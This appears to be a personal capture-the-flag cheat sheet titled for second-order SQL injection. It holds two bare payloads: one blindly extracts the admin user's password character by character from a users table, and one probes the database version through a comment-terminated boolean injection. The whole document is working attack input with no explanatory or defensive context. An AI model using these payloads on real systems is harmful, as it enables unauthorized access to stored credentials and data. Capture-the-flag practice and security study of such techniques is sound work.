# CTF SQLI second order

a'substr(password,1,1)from(users)where(username)='admin'='a

admin'or(ascii(substring(@@version,1,1))=56)#
